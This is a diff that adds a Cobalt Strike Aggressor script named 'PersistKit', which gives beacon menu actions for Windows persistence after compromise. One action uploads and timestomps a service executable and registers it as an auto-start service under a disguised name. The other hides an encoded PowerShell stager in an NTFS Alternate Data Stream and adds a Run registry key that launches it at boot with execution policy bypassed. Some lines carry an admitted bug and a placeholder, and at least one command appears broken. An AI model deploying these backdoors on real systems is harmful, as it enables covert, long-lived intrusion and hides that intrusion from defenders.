@@ -1,0 +1,84 @@
+# Actions in this kit center around endpoint persistence. Examples include backdoor service creation, backdoor process creation, etc
+# @Und3rf10w
+
+# Used for "Create Backdoor Service" action
+sub servicefilename {
+	$servicebackdoorfilename = matches($1, '[\/](\w+\.\w+)$');
+	$servicebackdoorfilename = $servicebackdoorfilename[0];
+	return $servicebackdoorfilename;
+}
+
+# Menu-driven operation to create an NTFS Alternate Data Stream backdoor that
+# 	autoruns on boot
+# 
+# BUG WARN: need to be able to get the folder location from specified file
+#	location to support ADS injection into both files and folders
+sub createADSBackdoor {
+	$bid = $1;
+	$selectedListener = $2;
+	prompt_text("Location of file/folder to give ADS?", "%APPDATA%\Temp", lambda({
+		# Here's the bug, if you can think of a better way to do this,
+		#   please submit a PR
+		bcd($bid, $1);
+		# Encode shellcode for the stager
+		$psPayload = powershell_encode_stager(shellcode($selectedListener));
+		# Create ADS file, ensure timestamps are not modified
+		bshell($bid, ">>adfjklbalgjbr.txt echo \"$psPayload\"");
+		btimestomp($bid, "adfjklbalgjbr.txt", $1);
+		bshell($bid, "type adfjklbalgjbr.txt > $1 $+ :gfdjkasghslkg.txt");
+		btimestomp($bid, "$1 $+ :gfdjkasghslkg.txt", "adfjklbalgjbr.txt");
+		brm($bid, "adfjklbalgjbr.txt");
+		$psExecBackdoorCmd = powershell_encode_stager("gc $FILE_TO_ADS:<randomshit.txt> | powershell.exe -noprofile -ep bypass -enc -");
+		getADSRegName();
+		# Write the reg key for the backdoor
+		bpowershell($1, "Set-Item -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \" $+ $theADSRegName $+ \" -PropertyType String -Value \"powershell.exe -ExecutionPolicy bypass -noprofile -enc $psExecBackdoorCmd \"");
+	} $bid => $1, $selectedListener => $2 ));
+}
+
+# Returns a string to use for the reg key name
+sub getADSRegName {
+	prompt_text("Service Name you'd like to use?", "IntelStartupSvc", {
+		$theADSRegName = $1;
+	});
+	return $theADSRegName;
+}
+
+popup beacon_bottom {
+	menu "PersistKit" {
+		menu "Windows"{
+			item "Create Backdoor Service"{
+				local ('$bid');
+				foreach $bid ($1){
+					prompt_file_open("Select the service exe to use", $null, false, {
+						println("\c4Uploading backdoor on beacon $1 using file $2 ");
+						blog($1, "Attempting to publish backdoor service");
+						bcd($1, "C:\\Windows\\");
+						println("\c4Changed directory on beacon $1 to C:\\Windows\\");
+						bupload($1, $2);
+						servicefilename($2);
+						btimestomp($1, "$servicebackdoorfilename", "C:\\Windows\\system32\\cmd.exe")
+						prompt_text("Name of service to use?", "GenericPrinterDriver", {
+							$serviceName = $1;
+						});
+						prompt_text("Service Display Name to use?", "Generic Printer Driver Support", {
+							$serviceDisplayName = $1;
+						});
+						bshell($1, "sc create $serviceName binPath= \"C:\\Windows\\ $+ $servicebackdoorfilename $+ \" start= auto DisplayName= \" $serviceDisplayName \"");
+						bshell($1, "sc start $serviceName ");
+						blog($1, "Backdoor service created using $servicebackdoorfilename ");
+						println("\c9[+] Backdoor creation complete!");
+					});
+				}
+			}
+			item "Create NTFS ADS Backdoor"{
+					local ('$bid');
+					# Open a payload selection dialoge, passes it to createADSBackdoor()
+					foreach $bid ($1){
+						openPayloadHelper(lambda({
+						createADSBackdoor($bid, $1);
+					}, $bid => $1));
+				}
+			}
+		}
+	}
+}
